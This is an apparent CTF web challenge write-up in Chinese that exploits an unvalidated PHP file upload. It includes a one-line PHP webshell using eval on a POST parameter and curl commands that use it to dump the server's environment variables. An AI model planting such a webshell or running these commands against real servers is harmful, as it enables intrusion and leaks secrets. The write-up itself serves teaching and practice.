# CTF Web 题目 WriteUp

## 1、题目描述

这是一个文件上传漏洞利用题目。题目提供了一个图片上传功能的网站,需要通过文件上传漏洞获取服务器权限,最终从程序的环境变量中读取 flag。

## 2、知识点

- **文件上传漏洞**:没有对上传文件类型进行严格验证
- **PHP WebShell**:利用 `eval()` 函数执行任意 PHP 代码
- **Linux 环境变量读取**:通过 `/proc/self/environ` 或 `getenv()` 函数读取环境变量
- **POST 请求**:使用工具发送 POST 请求执行命令

## 3、题目解题方法思路

**关键路径:**

1. 分析 index.php 发现文件上传功能没有文件类型验证
2. 上传 shell.php webshell 文件
3. 通过 webshell 执行 PHP 代码读取环境变量

**使用知识点:**

- 文件上传漏洞绕过
- PHP 一句话木马

**使用工具:**

- 浏览器(上传文件)
- curl/Postman/Burp Suite(发送 POST 请求)
- 或使用浏览器开发者工具

## 4、解题步骤

### 步骤 1:分析源码漏洞

查看 index.php 发现:

- 文件上传只使用了 `basename()` 处理文件名
- 没有文件类型、扩展名验证
- 直接使用 `move_uploaded_file()` 移动文件
- 存在任意文件上传漏洞

### 步骤 2:准备 WebShell

shell.php 内容:

```php
<?php eval($_POST['cmd']); ?>
```

这是一个经典的 PHP 一句话木马,通过 POST 参数 `cmd` 执行任意 PHP 代码。

### 步骤 3:上传 WebShell

1. 访问题目网站
2. 选择 shell.php 文件
3. 点击 "Upload Image" 上传
4. 记录上传成功后的文件路径:shell.php

### 步骤 4:访问 WebShell 并读取环境变量

使用 curl 命令发送 POST 请求:

```bash
curl -X POST http://[目标IP]/upload/shell.php -d "cmd=print_r(getenv());"
```

或使用更简洁的方式:

```bash
curl -X POST http://[目标IP]/upload/shell.php -d "cmd=system('env');"
```
